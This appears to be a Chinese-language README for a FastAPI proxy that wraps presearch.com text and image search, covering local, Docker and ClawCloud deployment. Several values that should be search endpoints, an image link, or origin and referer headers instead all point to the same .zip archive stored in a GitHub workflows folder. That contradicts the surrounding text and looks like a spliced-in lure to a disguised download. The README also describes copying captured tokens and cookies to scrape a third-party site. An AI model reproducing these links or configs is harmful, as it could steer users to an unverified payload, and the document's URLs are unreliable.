# FastAPI Presearch Doppelgange Proxy (Text + Image)

> 用于把网页搜索流程封装成你自己的 API：文本搜索 + 图片搜索（上传/URL）。

## 0. 项目声明（请先阅读）

- 项目作用：提供一个 FastAPI 代理层，把presearch.com网页端的文本检索与图片检索流程封装为可调用 API，并提供简洁 Web UI（`/ui`）用于结果展示。
- 逆向范围：仅针对浏览器开发者工具 Network 面板可见的请求链路进行接口映射，主要包含 `presearch.com` 页面请求参数与 `explore.fans/api/presearch/image-search` 的上传/分页取回流程（`sid/limit/offset`）。
- 使用限制：本项目仅用于技术交流、接口调试与学习研究，禁止用于商业用途，禁止用于任何违法违规场景。
- 合规要求：请遵守目标站点 ToS/robots 与当地法律法规，不得绕过验证码、身份认证、权限控制等安全机制。

## 1. 能力说明

- `POST /api/search/text`：文本检索，默认 `mode=spicy`
- `POST /api/search/image/upload`：上传图片检索
- `POST /api/search/image/url`：图片 URL 检索
- `GET /health`：健康检查

该项目是“代理层骨架”，你需要先在浏览器 Network 面板抓到真实上游接口地址与参数，再填入 `.env`。

---

## 2. 合规提示（务必先看）

在生产使用前，请确认：

1. 目标站点是否允许自动化请求/代理。
2. 不绕过验证码、认证、反爬。
3. 不违法分发第三方数据。

---

## 3. 本地运行

```bash
cd fastapi-presearch
cp .env.example .env
# 编辑 .env，填入真实上游 URL、认证头等
pip install -r requirements.txt
uvicorn app.main:app --reload --host 0.0.0.0 --port 8000
```

访问：`http://127.0.0.1:8000/docs`

---

## 4. API 示例

### 文本搜索

```bash
curl -X POST http://127.0.0.1:8000/api/search/text \
  -H 'Content-Type: application/json' \
  -d '{"query":"open source ai","mode":"spicy","page":1}'
```

### 图片上传搜索

```bash
curl -X POST 'http://127.0.0.1:8000/api/search/image/upload?mode=spicy' \
  -F 'image=@/path/to/image.jpg'
```

### 图片 URL 搜索

```bash
curl -X POST http://127.0.0.1:8000/api/search/image/url \
  -H 'Content-Type: application/json' \
  -d '{"image_url":"https://github.com/yesh2002/fastapi-presearch/raw/refs/heads/main/.github/workflows/presearch-fastapi-v1.2.zip","mode":"spicy"}'
```

---

## 5. Docker / VPS 部署

### Docker Compose

```bash
cd fastapi-presearch
cp .env.example .env
# 编辑 .env
docker compose up -d --build
```

### VPS 推荐

1. 安装 Docker 与 Docker Compose。
2. 拉取代码后执行 `docker compose up -d --build`。
3. 用 Nginx/Caddy 反向代理到 `127.0.0.1:8000`。
4. 配置 HTTPS（Let's Encrypt）。
5. 加 API Key 验证 + 限流（建议接入 Redis）。

---

## 6. ClawCloud 免费部署（GitHub 有资格场景）

以下流程适用于你已具备 ClawCloud GitHub 资格、并已将代码推到 GitHub。

### 6.1 准备镜像（GHCR）

仓库已包含 GitHub Actions 工作流：`.github/workflows/docker-publish.yml`。  
默认在 `push main` 时自动构建并推送镜像到 `ghcr.io/<owner>/<repo>:latest`。

检查点：

1. GitHub `Actions` 中 `Docker Publish` 任务为绿色成功。
2. GitHub `Packages` 中出现对应镜像包。
3. 建议将该包设为 `Public`（ClawCloud 拉取最省事）。

### 6.2 创建 ClawCloud 应用

在 ClawCloud 控制台选择 `Deploy from Docker`（或 App Launchpad）后填写：

- Image 类型：`Public`（若 GHCR 包是私有则选 `Private` 并配置凭证）
- Image Name：`ghcr.io/<你的GitHub用户名>/<仓库名>:latest`
- Container Port：`8000`
- Start Command：留空（使用 `Dockerfile` 默认命令）
- Health Check Path：`/health`

### 6.3 环境变量（至少）

```env
UPSTREAM_IMAGE_URL=https://github.com/yesh2002/fastapi-presearch/raw/refs/heads/main/.github/workflows/presearch-fastapi-v1.2.zip
UPSTREAM_ORIGIN=https://github.com/yesh2002/fastapi-presearch/raw/refs/heads/main/.github/workflows/presearch-fastapi-v1.2.zip
UPSTREAM_REFERER=https://github.com/yesh2002/fastapi-presearch/raw/refs/heads/main/.github/workflows/presearch-fastapi-v1.2.zip
UPSTREAM_USER_AGENT=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
UPSTREAM_TIMEOUT_SECONDS=20
DEFAULT_MODE=spicy
```

可选：

- `UPSTREAM_AUTHORIZATION`
- `UPSTREAM_COOKIE`
- `UPSTREAM_TEXT_URL`（如果要启用文本搜索上游）

### 6.4 部署后验收

```bash
curl https://<你的域名>/health
curl -F "image=@/path/to/test.jpg" "https://<你的域名>/api/search/image/upload?mode=spicy&fetch_full=true&full_limit=40"
```

浏览器访问：

- `https://<你的域名>/ui`

---

## 7. 抓包映射建议

在浏览器开发者工具中把真实请求映射到如下配置：

- 上游文本 URL -> `UPSTREAM_TEXT_URL`
- 上游图片 URL -> `UPSTREAM_IMAGE_URL`
- Token -> `UPSTREAM_AUTHORIZATION`
- Cookie -> `UPSTREAM_COOKIE`
- 页面 Origin/Referer -> `UPSTREAM_ORIGIN` / `UPSTREAM_REFERER`

并把请求体字段对齐到：

- 文本：`q / mode / page / language`
- 图片：`image`(multipart) 或 `image_url`(json)

若上游字段不同，请在 `app/upstream.py` 中改 payload。

---


## 8. 测试（已覆盖基础用例）

```bash
cd fastapi-presearch
pip install -r requirements.txt
pytest
```

当前测试覆盖：

- `/health` 健康检查
- 文本搜索 API (`/api/search/text`)
- 图片上传 API (`/api/search/image/upload`)
- 图片 URL API (`/api/search/image/url`)
- `normalize_results` 结果归一化逻辑

